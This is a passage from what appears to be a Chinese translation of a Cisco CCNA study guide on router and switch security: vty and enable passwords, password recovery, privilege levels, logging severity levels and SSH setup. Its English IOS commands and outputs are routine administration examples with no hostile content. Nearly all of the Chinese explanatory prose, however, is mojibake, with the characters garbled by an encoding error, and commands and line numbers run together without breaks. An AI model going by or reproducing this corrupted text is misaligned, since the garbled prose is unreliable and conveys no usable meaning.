in minutesRouter(config-line)#exec-timeout 2 ? &lt;0-2147483&gt; Timeout in seconds &lt;cr&gt;Router(config-line)#exec-timeout 2 30Router(config-line)# è¿œç¨‹ç™»é™†è®¿é—®ï¼ŒTelnet Access 1234567891011121314151617181920åœ¨æŸäººç»™è¿œç¨‹ç™»é™†æˆ–è€…è¯´è™šæ‹Ÿç»ˆç«¯çº¿è·¯æ·»åŠ äº†å£ä»¤ä¹‹å‰ï¼Œä½ å®é™…ä¸Šæ˜¯ä¸èƒ½è¿œç¨‹ç™»é™†è¿›ä¸€å°è·¯ç”±å™¨çš„ã€‚åŒæ ·ï¼Œä½ å¯ä»¥ç»™è™šæ‹Ÿç»ˆç«¯çº¿è·¯æ·»åŠ ä¸€ä¸ªå£ä»¤ï¼Œæˆ–æ˜¯å‘Šè¯‰è·¯ç”±å™¨å»æŸ¥æ‰¾ä¸€ä¸ªæœ¬åœ°ç”¨æˆ·ååŠå£ä»¤ç»„åˆï¼ˆè¯¥ç»„åˆå¯ä»¥åœ¨é…ç½®æ–‡ä»¶ä¸­ï¼Œæˆ–æ˜¯å­˜å‚¨åœ¨ä¸€å° RADIUS/TACACS æœåŠ¡å™¨ä¸Šï¼‰ï¼Œå¦‚ä¸‹é¢æ‰€ç¤ºã€‚Router(config-line)#line vty 0 15Router(config-line)#password ciscoRouter(config-line)#login â† or login localä¸‹é¢çš„è¾“å‡ºæ˜¯è‡ªæŸå°è·¯ç”±å™¨åˆ°å¦ä¸€å°çš„è¿œç¨‹ç™»é™†ä¼šè¯ã€‚å½“ä½ è·å¾—è¿œç¨‹ç™»é™†è®¿é—®æ—¶ï¼Œä½ å¯ä»¥çœ‹åˆ°ä¸»æœºåå‘ç”Ÿäº†æ”¹å˜ã€‚æ³¨æ„åœ¨ä½ è¾“å…¥å£ä»¤æ—¶ï¼Œå®ƒçœ‹ä¸åˆ°ã€‚Router1#telnet 192.168.1.2Trying 192.168.1.2 ...OpenUser Access VerificationUsername: paulPassword:Router2&gt;è€Œå¦‚ä½ æœ‰ä¸€ä¸ªå®‰å…¨ç‰ˆ IOS é•œåƒï¼Œåˆ™å¯ä»¥å°†è·¯ç”±å™¨é…ç½®ä¸ºä»…å…è®¸å®‰å…¨å£³è®¿é—®ï¼Œè€Œä¸æ˜¯è¿œç¨‹ç™»é™†è®¿é—®ã€‚è¿™æ ·åšçš„å¥½å¤„åœ¨äºæ‰€æœ‰æ•°æ®éƒ½æ˜¯åŠ å¯†äº†çš„ã€‚å¦‚ä½ åœ¨å¯ç”¨å®‰å…¨å£³åï¼Œå†æ¬¡ä½¿ç”¨è¿œç¨‹ç™»æ—¶ï¼Œè¿æ¥å°†è¢«ç»ˆæ­¢ã€‚Router1(config)#line vty 0 15Router1(config-line)#transport input sshRouter2#telnet 192.168.1.2Trying 192.168.1.2 ...Open[Connection to 192.168.1.2 closed by foreign host] ä½¿èƒ½æ¨¡å¼ä¿æŠ¤ï¼ŒProtecting Enable Mode 12345678910111213141516171819202122232425ä½¿èƒ½æ¨¡å¼ï¼ˆenable modeï¼‰å–å¾—è·¯ç”±å™¨çš„é…ç½®è®¿é—®ï¼Œå› æ­¤ä½ ä¼šæƒ³è¦ä¿æŠ¤è¯¥æ¨¡å¼ã€‚ä½ å¯ä»¥é…ç½®ä¸€ä¸ªä½¿èƒ½ç§˜å¯†ï¼ˆan enable secretï¼‰æˆ–ä½¿èƒ½å£ä»¤ï¼ˆan enable passwordï¼‰ã€‚å®é™…ä¸Šï¼Œä½¿èƒ½ç§˜å¯†å’Œä½¿èƒ½å£ä»¤æ˜¯å¯ä»¥åŒæ—¶æœ‰çš„ï¼Œä½†è¿™æ˜¯ä¸€ä¸ªåä¸»æ„ã€‚ä½¿èƒ½å£ä»¤æ˜¯æœªåŠ å¯†çš„ï¼Œæ‰€ä»¥åœ¨è·¯ç”±å™¨é…ç½®ä¸­å¯ä»¥çœ‹åˆ°ã€‚è€Œä½¿èƒ½ç§˜å¯†æœ‰ 5 çº§åŠ å¯†(level 5 encryption, MD5)ï¼Œéš¾äºç ´è§£ã€‚è‡ª 15.0(1ï¼‰S åçš„è¾ƒæ–° IOS ç‰ˆæœ¬ä¸­ï¼Œè¿˜å¯ä»¥ä½¿ç”¨æ¯” MD5 åŠ å¯†é«˜çº§çš„ 4 çº§åŠ å¯†ï¼ˆlevel 4 encryption, SHA256ï¼‰, 5 çº§åŠ å¯†æœ€ç»ˆä¼šä¸èµæˆä½¿ç”¨ã€‚ä½ å¯ä»¥ç»™ä½¿èƒ½å£ä»¤åŠ ä¸Šå‘½ä»¤ service password-encryption, ä½†å› ä¸ºæ­¤æ–¹å¼ä½¿ç”¨ 7 çº§åŠ å¯†(level 7 encryption, æ¯”å¦‚ï¼Œä½å®‰å…¨æ€§ï¼›æ€ç§‘ç§°å…¶ä¸ºâ€œèƒŒåå®‰å…¨æ€§ï¼Œover the shoulder securityâ€, å› å…¶ä»…éœ€æŸäººä»ä½ èƒŒåå·çœ‹å¹¶è®°ä½ä¸€ä¸ªç¨éš¾çš„è¯ç»„ï¼Œä¾¿å¯ä»¥ç”¨ç½‘ä¸Šçš„ 7 çº§å£ä»¤è§£å¯†å·¥å…·äºˆä»¥ç ´è§£)ï¼Œè€Œå¾ˆå®¹æ˜“è¢«ç ´è§£ã€‚ä¸‹é¢çš„è¾“å‡ºä¸­å¯ä»¥çœ‹åˆ° 7 çº§ä¸ 5 çº§åŠ å¯†æ–‡æœ¬ã€‚Router(config)#enable password ciscoRouter(config)#exitRouter#show runenable password ciscoRouter(config)#enable password ciscoRouter(config)#service password-encryptionRouter#show runenable password 7 0822455D0A16Router(config)#enable secret ciscoRouter(config)#exitRouter#show runenable secret 5 $1$mERr$hx5rVt7rPNoS4wqbXKX7m0è®°ä½å¦‚ä½ å¿˜è®°äº†ä½¿èƒ½å£ä»¤ï¼Œä½ å°†ä¸å¾—ä¸å¯¹è·¯ç”±å™¨æˆ–äº¤æ¢æœºè¿›è¡Œä¸€ä¸‹å£ä»¤æ¢å¤æ“ä½œã€‚è¯·ç”¨ Google æœç´¢ä½ æ‰€ä½¿ç”¨çš„å‹å·ï¼Œå› ä¸ºå‹å·ä¸åŒå…¶å£ä»¤æ¢å¤è¿‡ç¨‹ä¹Ÿä¸ä¸€æ ·ã€‚å¯¹äºè·¯ç”±å™¨æ¥è¯´ï¼Œæ¶‰åŠè®¾å¤‡é‡å¯ï¼Œä»¥åŠåœ¨é‡å¯è¿‡ç¨‹ä¸­æŒ‰ä¸‹æŒ‡å®šçš„ä¸­æ–­é”®ç›˜æŒ‰é”®å†è®¾ç½®é…ç½®å¯„å­˜å™¨ï¼ˆthe configuration registerï¼‰ä»¥è·³è¿‡å¯åŠ¨é…ç½®æ–‡ä»¶ï¼ˆé€šå¸¸å°†é…ç½®å¯„å­˜å™¨è®¾ç½®ä¸º 0x2142ï¼‰æ¥ç€è¦æ‰§è¡Œä¸€ä¸ª copy start-config running-config å‘½ä»¤æ­¤æ—¶ï¼Œå°±å¯ä»¥åˆ›å»ºæ–°çš„å£ä»¤äº†ã€‚è€Œå¯¹äº¤æ¢æœºæ¥è¯´ï¼Œå£ä»¤æ¢å¤è¿‡ç¨‹ä¼šæœ‰ä¸€ç‚¹å¤æ‚ï¼ˆè¯·å†æ¬¡ç”¨ Google æœç´¢ä½ ç”¨åˆ°çš„å…·ä½“äº¤æ¢æœºå‹å·ï¼‰ï¼Œä½†ä¹Ÿå¯ä»¥é€šè¿‡ä¸€ä¸ªå°æŠŠæˆå®ç°å£ä»¤æ¢å¤ -- åœ¨ç»™äº¤æ¢æœºä¸Šç”µæ—¶ï¼ŒæŒ‰ä½ MODE æŒ‰é’®8ç§’é’Ÿã€‚äº¤æ¢æœºå°†ä»¥ç©ºç™½é…ç½®å¯åŠ¨ï¼Œè€Œä¸Šä¸€æ¬¡çš„å¯åŠ¨é…ç½®(the last startup configuration)å°†ä¿å­˜åœ¨ flash ä¸­çš„ config.text.renamed æ–‡ä»¶é‡Œå¤´ï¼Œæ‰€ä»¥è¯¥æ–‡ä»¶å¯å¤åˆ¶ç”¨äºè¿è¡Œé…ç½®(running configuration)ï¼Œç„¶åç”¨å…¶å®ƒå£ä»¤å¯¹å…¶è¿›è¡Œä¿®æ”¹ã€‚ ç”¨æˆ·è®¿é—®é˜²æŠ¤ï¼ŒProtecting User Access 12345678910111213141516171819202122232425262728293031323334353637383940414243444546æ€ç§‘ IOS æä¾›å¯¹ç”¨æˆ·çš„å•ç‹¬ç”¨æˆ·ååŠå£ä»¤ï¼ŒåŒæ—¶å¯¹æ‰€èƒ½å¤Ÿä½¿ç”¨çš„å‘½ä»¤è¿›è¡Œæ¸…å•é™åˆ¶çš„èƒ½åŠ›ã€‚è¿™åœ¨åˆ†å±‚æ¬¡ç½‘ç»œæ”¯æŒæ—¶æ˜¯æœ‰ç”¨çš„ã€‚ä¸‹åˆ—è¾“å‡ºä¸­ç»™å‡ºäº†ä¸€ä¸ªç¤ºä¾‹ã€‚RouterA#config termEnter configuration commands, one per line. End with CNTL/Z.RouterA(config)#username paul password ciscoRouterA(config)#username stuart password helloRouterA(config)#username davie password footballRouterA(config)#line vty 0 4RouterA(config-line)#login localRouterA(config-line)#exitRouterA(config)#exitä½ å¯åœ¨è·¯ç”±å™¨ä¸ŠæŒ‡æ´¾ä¸åŒç”¨æˆ·å¸å·çš„è®¿é—®çº§åˆ«ã€‚æ¯”å¦‚ï¼Œä½ ä¹Ÿè®¸æ‰“ç®—é‚£äº›åˆçº§ç½‘ç»œå›¢é˜Ÿæˆå‘˜ä»…èƒ½ä½¿ç”¨ä¸€äº›åŸºæœ¬çš„æ•…éšœæ’é™¤å‘½ã€‚ä½ è¿˜æœ‰å¿…è¦è®°ä½æ€ç§‘è·¯ç”±å™¨æœ‰å£ä»¤å®‰å…¨çš„ä¸¤ç§æ¨¡å¼ï¼ˆtwo modes of password securityï¼‰ï¼Œç”¨æˆ·æ¨¡å¼ï¼ˆExec modeï¼‰å’Œç‰¹æƒæ¨¡å¼ï¼ˆEnable modeï¼‰ã€‚æ€ç§‘è·¯ç”±å™¨æœ‰å¯ä¾›é…ç½®çš„ 16 ç§ï¼ˆ0 åˆ° 15ï¼‰ä¸åŒç‰¹æƒçº§åˆ«ï¼Œå…¶ä¸­ 15 çº§æ˜¯å®Œå…¨çš„è®¿é—®æƒé™ï¼Œå¦‚ä¸‹æ‰€ç¤ºã€‚RouterA#conf tEnter configuration commands, one per line. End with CNTL/Z.RouterA(config)#username support privilege 4 password soccer LINE Initial keywords of the command to modifyRouterA(config)#privilege exec level 4 pingRouterA(config)#privilege exec level 4 tracerouteRouterA(config)#privilege exec level 4 show ip interface briefRouterA(config)#line console 0RouterA(config-line)#password basketballRouterA(config-line)#login local â† password is neededRouterA(config-line)#^zæ”¯æŒé‚£äººåœ¨ç™»å…¥åˆ°è·¯ç”±å™¨å¹¶å°è¯•è¿›å…¥é…ç½®æ¨¡å¼æ—¶ï¼Œæ­¤å‘½ä»¤åŠå…¶å®ƒå‘½ä»¤å°†ä¸å¯ç”¨ä¸”æ— æ•ˆï¼Œä¹Ÿä¸èƒ½çœ‹åˆ°ã€‚RouterA con0 is now availablePress RETURN to get started.User Access VerificationUsername: supportPassword:RouterA#config t â† not allowed to use this ^% Invalid input detected at â€˜^â€™ marker.ä½ å¯åœ¨è·¯ç”±å™¨æç¤ºç¬¦ä¸‹æŸ¥çœ‹é»˜è®¤çš„ä¸åŒç‰¹æƒçº§åˆ«(the default privilege levels)ã€‚Router&gt;show privilegeCurrent privilege level is 1Router&gt;enRouter#show privRouter#show privilegeCurrent privilege level is 15Router# æ›´æ–° IOSï¼Œ updating the IOS 12345å…¬è®¤åœ°ï¼Œæ›´æ–° IOS æœ‰æ—¶ä¼šå°†æ¼æ´æˆ–æ•…éšœå¼•å…¥ä½ çš„ç½‘ç»œä¸­ï¼Œå› æ­¤ï¼Œå¦‚ä½ æœ‰ä¸æ€ç§‘å…¬å¸æœ‰ä¸ªæŠ€æœ¯æ”¯æŒåˆåŒï¼ˆa TAC contract, Technical Assistance Centre, TAC), é‚£ä¹ˆæœ€å¥½çš„åšæ³•å°±æ˜¯ä¾æ®æ€ç§‘å…¬å¸çš„å»ºè®®æ¥åšã€‚ä¸€èˆ¬æ¥è®²ï¼Œä¿æŒ IOS ç‰ˆæœ¬æœ€æ–°æ˜¯é«˜åº¦æ¨èçš„åšæ³•ã€‚è—‰ç”±æ›´æ–° IOSï¼Œ ä½ èƒ½å¾—åˆ°ä¸‹é¢è¿™äº›å¥½å¤„ã€‚ä¿®æ­£å·²çŸ¥çš„è½¯ä»¶ç¼ºé™·ï¼Œfixed known bugsè§£å†³å®‰å…¨éšæ‚£ï¼Œcloese security vulnerabilitiesæä¾›ç‰¹æ€§å¼ºåŒ–åŠ IOS èƒ½åŠ›æå‡ï¼ŒOffers enhanced features and IOS capabilities è·¯ç”±å™¨æ—¥å¿—è®°å½•ï¼ŒRouter Logging 1234567891011121314151617181920212223242526272829303132333435363738394041424344è·¯ç”±å™¨æä¾›äº‹ä»¶è®°å½•çš„èƒ½åŠ›ã€‚å®ƒä»¬å¯å°†æ—¥å¿—æ¶ˆæ¯ç…§ä½ çš„æ„æ„¿ï¼Œå‘é€åˆ°å±å¹•æˆ–æŸå°æœåŠ¡å™¨ã€‚ä½ åº”è¯¥è®°å½•è·¯ç”±å™¨æ¶ˆæ¯ï¼Œè€Œåˆæœ‰8ä¸ªå¯ç”¨çš„æ—¥å¿—è®°å½•ä¸¥é‡ç¨‹åº¦çº§åˆ«ï¼ˆè€ƒè¯•è¦æ±‚ä½ çŸ¥é“è¿™äº›ä¸åŒçš„çº§åˆ«ï¼‰ï¼Œå¦‚ä¸‹é¢è¾“å‡ºä¸­çš„ç²—ä½“å­—æ‰€ç¤ºã€‚logging buffered ?`&lt;0-7&gt;`Logging severity levelalertsâ€”Immediate action needed (severity=1)criticalâ€”Critical conditions (severity=2)debuggingâ€”Debugging messages (severity=7)emergenciesâ€”System is unusable (severity=0)errorsâ€”Error conditions (severity=3)informationalâ€”Informational messages (severity=6)notificationsâ€”Normal but significant conditions (severity=5)warningsâ€”Warning conditions (severity=4)è€Œä½ æœ‰å¯ä»¥å°†è¿™äº›æ—¥å¿—æ¶ˆæ¯å‘å¾€å‡ ä¸ªä¸åŒçš„åœ°æ–¹ã€‚Router(config)#logging ? A.B.C.D IP address of the logging host buffered Set buffered logging parameters console Set console logging parameters host Set syslog server IP address and parameters on Enable logging to all enabled destinations trap Set syslog server logging level userinfo Enable logging of user info on privileged mode enablingæ—¥å¿—æ¶ˆæ¯é€šå¸¸ä¼šåœ¨ä½ ç»ç”±æ§åˆ¶å°è¿›å…¥åˆ°è·¯ç”±å™¨æ—¶ï¼Œæ˜¾ç¤ºåœ¨å±å¹•ä¸Šã€‚è€Œè¿™å¯èƒ½ä¼šåœ¨ä½ æ•²å…¥é…ç½®å‘½ä»¤æ—¶å¤šå°‘æœ‰äº›çƒ¦äººã€‚è¿™é‡Œå°±æœ‰ä¸ªåœ¨æˆ‘è¾“å…¥ä¸€ä¸ªå‘½ä»¤ï¼ˆåŠ äº†ä¸‹åˆ’çº¿çš„é‚£æ¡ï¼‰æ—¶ï¼Œè¢«ä¸€æ¡æ§åˆ¶å°æ—¥å¿—æ¶ˆæ¯(a console logging message)ç»™ä¸­æ–­äº†çš„ä¾‹å­ã€‚Router(config)#int f0/1Router(config-if)#no shutRouter(config-if)#endRouter#*Jun 27 02:06:59.951: %SYS-5-CONFIG_I: Configured from console by console &lt;u&gt;show ver&lt;/u&gt;*Jun 27 02:07:01.151: %LINK-3-UPDOWN: Interface FastEthernet0/1, changed state to upæ­¤æ—¶ä½ æ—¢å¯ä»¥ç”¨å‘½ä»¤ no logging console å…³é—­æ—¥å¿—æ¶ˆæ¯è¾“å‡ºï¼Œä¹Ÿå¯ä»¥ç”¨ logging synchronous å‘½ä»¤å°†å®ƒä»¬è®¾ç½®ä¸ºæ— ä¸­æ–­ï¼ˆnot interruptï¼‰ï¼Œ logging synchronous å‘½ä»¤ä¼šé‡æ–°è¾“å…¥åœ¨è¢«æ—¥å¿—æ¶ˆæ¯ä¸­æ–­ä¹‹å‰ï¼Œä½ æ‰€è¾“å…¥çš„é‚£è¡Œå‘½ä»¤ã€‚logging synchronous å‘½ä»¤åœ¨è™šæ‹Ÿç»ˆç«¯çº¿è·¯ä¸Šä¹Ÿæ˜¯å¯ç”¨çš„ã€‚Router(config)#line con 0Router(config-line)#logging synchronousRouter(config-line)#Router(config-line)#exitRouter(config)#int f0/1Router(config-if)#shutRouter(config-if)#exitRouter(config)#*Jun 27 02:12:46.143: %LINK-5-CHANGED: Interface FastEthernet0/1, changed state toadministratively downRouter(config)#exitè¿™é‡Œå€¼å¾—ä¸€æçš„æ˜¯ï¼Œåœ¨ä½ ç»ç”± Telnet (æˆ– SSH) è¿›å…¥åˆ°è·¯ç”±å™¨æ—¶ï¼Œä½ æ˜¯ä¸ä¼šçœ‹åˆ°æ§åˆ¶å°è¾“çš„ã€‚å¦‚ä½ æƒ³åœ¨æ­¤æ—¶çœ‹åˆ°æ—¥å¿—æ¶ˆæ¯ï¼Œæ‰§è¡Œ terminal monitor å‘½ä»¤å³å¯ã€‚ ç®€å•ç½‘ç»œç®¡ç†åè®®ï¼ŒSimple Network Management Protocol, SNMP 12345SNMP æ˜¯ä¸€ç§å¯ç”¨äºè¿œç¨‹ç®¡ç†ç½‘ç»œçš„æœåŠ¡ã€‚å®ƒç”±ä¸€å°ç½‘ç»œç®¡ç†å‘˜ç»´æŠ¤ã€è¿è¡Œäº† SNMP ç®¡ç†è½¯ä»¶çš„ä¸­å¿ƒå·¥ä½œç«™ï¼ŒåŠåŒ…æ‹¬è·¯ç”±å™¨ã€äº¤æ¢æœºåŠæœåŠ¡å™¨ç­‰çš„ï¼Œå„å°ç½‘ç»œè®¾å¤‡ä¸Šçš„å°æ–‡ä»¶ï¼ˆä»£ç†ï¼Œagentsï¼‰æ„æˆã€‚åŒ…æ‹¬ HPã€Ciscoã€IBM åŠ SolarWinds ç­‰çš„å‡ å®¶å‚å•†ï¼Œéƒ½æœ‰è®¾è®¡ SNMP è½¯ä»¶ã€‚ä¹Ÿæœ‰å¾ˆå¤šå¼€å‘æºä»£ç ç‰ˆæœ¬çš„ SNMP è½¯ä»¶å¯ç”¨ã€‚è¿™ç±»è½¯ä»¶å…è®¸ä½ ç›‘æµ‹è®¾å¤‡çš„å¸¦å®½åŠæ´»åŠ¨æƒ…å†µï¼Œæ¯”å¦‚ç™»é™†æ´»åŠ¨ä»¥åŠç«¯å£çŠ¶æ€ç­‰ã€‚è¿ç”¨ SNMPï¼Œ ä½ å¯ä»¥è¿œç¨‹åœ°é…ç½®æˆ–æ˜¯å…³é—­ç«¯å£å’Œè®¾å¤‡ã€‚ä½ ä¹Ÿå¯ä»¥å°†å…¶é…ç½®åœ¨æŸäº›æ¡ä»¶è§¦å‘æ—¶ï¼Œè¯¸å¦‚å‡ºç°é«˜å¸¦å®½æˆ–æ˜¯ç«¯å£å®•æ‰æ—¶ï¼Œå‘å‡ºè­¦å‘Šæ¶ˆæ¯ã€‚æˆ‘ä»¬ä¼šåœ¨ç¬¬ 40 å¤©æ¥è®² SNMP çš„ç»†èŠ‚ï¼Œå› ä¸º SNMP æ˜¯ ICND2 å¤§çº²çš„éƒ¨åˆ†ã€‚ åŠ å›ºäº¤æ¢æœºï¼ŒSecuring the Switch 123456é˜»æ­¢è¿œç¨‹ç™»é™†è®¿é—®ï¼ŒPrevent Telnet Accessè¿œç¨‹ç™»é™†æµé‡ä»¥æ˜æ–‡æ–¹å¼å‘é€å£ä»¤ï¼Œè¿™å°±æ˜¯è¯´ï¼Œå¯è½»æ˜“åœ°åœ¨é…ç½®ä¸­è¯»å–å£ä»¤ï¼Œæˆ–æ˜¯æœ‰äººæ¥åˆ°ä½ çš„ç½‘ç»œä¸Šï¼Œé‚£ä¹ˆå°±èƒ½é€šè¿‡ç½‘ç»œå—…æ¢è½¯ä»¶æŸ¥çœ‹åˆ°å£ä»¤ã€‚é»˜è®¤æƒ…å†µä¸‹ï¼Œè¿œç¨‹ç™»é™†å®é™…ä¸Šæ˜¯å…³é—­çš„ï¼ˆä¹Ÿå°±æ˜¯è¯´ï¼Œä½ éœ€è¦ä¸ºå…¶è®¾ç½®ä¸€ä¸ªå£ä»¤ï¼Œä¹Ÿå¯é€‰æ‹©è®¾ç½®ä¸€ä¸ªç”¨æˆ·åï¼Œæ¥è®©å…¶å·¥ä½œï¼‰ã€‚ä¸è¿‡ï¼Œå¦‚ä½ ä»æƒ³è¦æœ‰å¯¹ç®¡ç†ç«¯å£çš„è¿œç¨‹è®¿é—®çš„è¯ï¼Œä½ å¯ä½¿ç”¨å‘½ä»¤ transport input ssh, å¼€å¯åˆ°äº¤æ¢æœºçš„ SSH é€šä¿¡ï¼Œè¿™å·²åœ¨å‰é¢è®¨è®ºè¿‡äº†ã€‚Farai è¯´ -- â€œæ‰€æœ‰è™šæ‹Ÿç»ˆç«¯çº¿è·¯ä¸‹ï¼Œå‘½ä»¤ transport input all æ˜¯é»˜è®¤å¼€å¯çš„ï¼Œè€Œå…¶å®ƒçº¿è·¯çš„ transport input none å‘½ä»¤æ˜¯é»˜è®¤å¼€å¯çš„ã€‚â€ å¼€å¯ SSHï¼Œ Enable SSH 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108å°½å¯èƒ½åœ°é‡‡ç”¨ SSH è€Œä¸æ˜¯ Telnet åŠ SNMP æ¥è®¿é—®ä½ çš„äº¤æ¢æœºã€‚SSH è¡¨ç¤ºå®‰å…¨å£³(secure shell), ä»¤åˆ°æŸç½‘ç»œä¸Šçš„ä¸¤å°è®¾å¤‡ä¹‹é—´ä¿¡æ¯çš„å®‰å…¨äº¤æ¢ã€‚SSH é‡‡ç”¨å…¬é’¥åŠ å¯†æ³•ï¼ˆpubic-key cryptographyï¼‰æ¥è®¤è¯è¿æ¥è®¾å¤‡ã€‚Telnet åŠ SNMP ç‰ˆæœ¬ 1 å’Œ 2 éƒ½æ˜¯æœªåŠ å¯†çš„ï¼Œæ˜“å—åŒ…å—…æ¢ï¼ˆpacket sniffingï¼‰çš„å½±å“ï¼Œ SNMP ç‰ˆæœ¬ 3 æä¾›äº†ä¿å¯†æ€§ -- æ•°æ®åŒ…æœ‰åŠ å¯†ä»¥é˜²æ­¢æ¶æ„æºçªƒå–æ•°æ®ï¼ˆsnooping by an unauthorised sourceï¼‰ã€‚è¦å¼€å¯ SSHï¼Œ ä½ éœ€è¦æœ‰ä¸€ä¸ªæ”¯æŒåŠ å¯†çš„ IOS ç‰ˆæœ¬ã€‚ä¸€ç§å¿«é€Ÿæ‰¾å‡º IOS é•œåƒæ˜¯å¦æ”¯æŒåŠ å¯†çš„æ–¹æ³•æ˜¯æ‰§ show version å‘½ä»¤ã€‚æŸ¥æ‰¾é•œåƒæ–‡ä»¶åä¸­æœ‰æ—  k9 å­—æ ·ï¼Œæˆ–è€…åœ¨æ€ç§‘ç³»ç»Ÿå…¬å¸çš„å®‰å…¨æ€§å£°æ˜ä¸­æŸ¥æ‰¾æœ‰å…³å­—å¥ã€‚Switch#sh versionCisco IOS Software, C3560 Software (C3560-ADVIPSERVICES K9-M), Version12.2(35)SE1, RELEASE SOFTWARE (fc1)Copyright (c) 1986-2006 by Cisco Systems, Inc.Compiled Tue 19-Dec-06 10:54 by antonioImage text-base: 0x00003000, data-base: 0x01362CA0ROM: Bootstrap program is C3560 boot loaderBOOTLDR: C3560 Boot Loader (C3560-HBOOT-M) Version 12.2(25r)SEC, RELEASESOFTWARE (fc4)Switch uptime is 1 hour, 8 minutesSystem returned to ROM by power-onSystem image file is â€œflash:/c3560-advipservicesk9-mz.122-35.SE1.binâ€This product contains cryptographic features and is subject to United States and localcountry laws governing import, export, transfer and use. Delivery of Cisco cryptographicproducts does not imply third-party authority to import, export, distribute or useencryption. Importers, exporters, distributors and users are responsible for compliancewith U.S. and local country laws. By using this product you agree to comply withapplicable laws and regulations. If you are unable to comply with U.S. and local laws,return this product immediately. A summary of U.S. laws governing Cisco cryptographicproducts may be found at:http://www.cisco.com/wwl/export/crypto/tool/stqrg.htmlIf you require further assistance please contact us by sending email to export@cisco.com.--More-æ³¨æ„: å¦‚ä½ æ²¡æœ‰å¸¦æœ‰å®‰å…¨ç‰¹æ€§ç‰ˆæœ¬çš„ IOSï¼Œä½ å°±å¿…é¡»ä¸ºæ­¤ä»˜è´¹è´­ä¹°ã€‚ä¸ºå»ºç«‹åŠ å¯†è¿æ¥ï¼Œä½ éœ€è¦åœ¨äº¤æ¢æœºä¸Šåˆ›å»ºä¸€å¯¹å…¬é’¥å’Œç§é’¥ï¼ˆa private/public key, è§ä¸‹é¢ï¼‰ã€‚åœ¨è¿æ¥æ—¶ï¼Œä½ è¿™è¾¹ä½¿ç”¨å…¬é’¥åŠ å¯†æ•°æ®ï¼Œäº¤æ¢æœºå°†ä¼šä½¿ç”¨å®ƒçš„ç§é’¥æ¥è§£å¯†æ•°æ®ã€‚è€Œåœ¨è®¤è¯æ—¶ï¼Œä½¿ç”¨ä½ æ‰€é€‰æ‹©çš„ç”¨æˆ·å/å£ä»¤ç»„åˆã€‚ä¸‹ä¸€ä¸ªé—®é¢˜æ˜¯ï¼Œè¦è®¾ç½®äº¤æ¢æœºçš„ä¸»æœºåå’ŒåŸŸåï¼ˆhostname and domain nameï¼‰, å› ä¸ºåœ¨åˆ›å»ºå…¬é’¥/ç§é’¥å¯¹æ—¶ï¼Œä¼šç”¨åˆ°ä¸»æœºå.åŸŸåå‘½åæ³•ï¼ˆhostname.domainname nomenclatureï¼‰ã€‚æ˜¾ç„¶ï¼Œåœ¨å‘½åä¸»æœºåå’ŒåŸŸåæ—¶ï¼Œå°†å…¶å‘½åä¸ºèƒ½å¤Ÿä»£è¡¨ç³»ç»Ÿçš„æœ‰æ„ä¹‰åå­—ï¼Œæ˜¯å¥½çš„åšæ³•ã€‚é¦–å…ˆï¼Œä½ è¦ç»™äº¤æ¢æœºä¸€ä¸ªä¸é»˜è®¤ä¸»æœºå Switch ä¸ä¸€æ ·çš„ä¸»æœºåã€‚æ¥ç€ï¼Œæ·»åŠ å…¶åŸŸåï¼ˆè¯¥åŸŸåé€šå¸¸ä¸ Windows æ´»åŠ¨ç›®å½•çš„ FQDN ä¸€è‡´ï¼‰ã€‚è¿™æ—¶å°±å¯ä»¥åˆ›å»ºç”¨äºç§˜å¯†çš„å¯†é’¥ï¼ˆthe crypto keyï¼‰äº†ã€‚ç³»æ•°/æ¨¡é‡ï¼ˆthe modulusï¼‰ æ˜¯æŒ‡ä½ æ‰€å¸Œæœ›ä½¿ç”¨çš„å¯†é’¥çš„é•¿åº¦ï¼Œå–å€¼èŒƒå›´æ˜¯ 360 åˆ° 2048, åè€…å…·æœ‰æœ€é«˜çš„å®‰å…¨æ€§ï¼›é«˜äº 1024 ä½çš„æ¨¡é‡å°±è®¤ä¸ºæ˜¯å®‰å…¨çš„äº†ã€‚æ­¤æ—¶ï¼Œäº¤æ¢æœºä¸Šçš„ SSH å°±å·²ç»å¼€å¯äº†ã€‚æœ‰ä¸€äº› SSH ç›¸å…³çš„ç»´æŠ¤å‘½ä»¤éœ€è¦è¾“å…¥ã€‚ip ssh time-out 60 å‘½ä»¤ä¼šå°†ä»»ä½•ç©ºé—² 60 ç§’çš„ SSH è¿æ¥ç½®ä¸ºè¶…æ—¶ã€‚è€Œå‘½ä»¤ ip ssh authentication-retries 2 åˆ™ä¼šåœ¨è®¤è¯å¤±è´¥ä¸¤æ¬¡çš„ SSH è¿æ¥é‡ç½®ä¸ºåˆå§‹çŠ¶æ€ã€‚æ­¤è®¾ç½®å¹¶ä¸ä¼šé˜»æ­¢ç”¨æˆ·å»ºç«‹æ–°çš„è¿æ¥å¹¶é‡è¯•è®¤è¯ã€‚è®¾ç½®è¿‡ç¨‹å¦‚ä¸‹æ‰€ç¤ºã€‚Switch(config)#hostname SwitchOneSwitchOne(config)#ip domain-name mydomain.comSwitchOne(config)#crypto key generate rsaEnter modulus: 1024SwitchOne(config)#ip ssh time-out 60SwitchOne(config)#ip ssh authentication-retries 2å¯ä½¿ç”¨å‘½ä»¤ ip ssh version 2 å¼€å¯ SSH ç‰ˆæœ¬2ã€‚è®©æˆ‘ä»¬çœ‹çœ‹å…¶ä¸­ä¸€ä¸ªå¯†é’¥ã€‚åœ¨è¿™ä¸ªå®ä¾‹ä¸­ï¼Œè¯¥å¯†é’¥æ˜¯ä¸º HTTPS ç”Ÿæˆçš„ã€‚å› ä¸ºå…¶æ˜¯åœ¨å¼€å¯ HTTPS æ—¶è‡ªåŠ¨ç”Ÿæˆçš„ï¼Œæ‰€ä»¥å…¶åç§°ä¹Ÿä¼šè‡ªåŠ¨äº§ç”Ÿã€‚firewall#show crypto key mypubkey rsaKey name: HTTPS_SS_CERT_KEYPAIR.serverTemporary keyUsage: Encryption KeyKey is not exportable.Key Data:306C300D 06092A86 4886F70D 01010105 00035B00 30580251 00C41B63 8EF294A1DC0F7378 7EF410F6 6254750F 475DAD71 4E1CD15E 1D9086A8 BD175433 1302F4032FD22F82 C311769F 9C75B7D2 1E50D315 EFA0E940 DF44AD5A F717BF17 A3CEDBE1A6A2D601 45F313B6 6B020301 0001è¦éªŒè¯äº¤æ¢æœºä¸Šçš„ SSH å¼€å¯ï¼Œè¾“å…¥ä»¥ä¸‹å‘½ä»¤ã€‚Switch#show ip sshSSH Enabled - version 1.99Authentication timeout: 120 secs; Authentication retries: 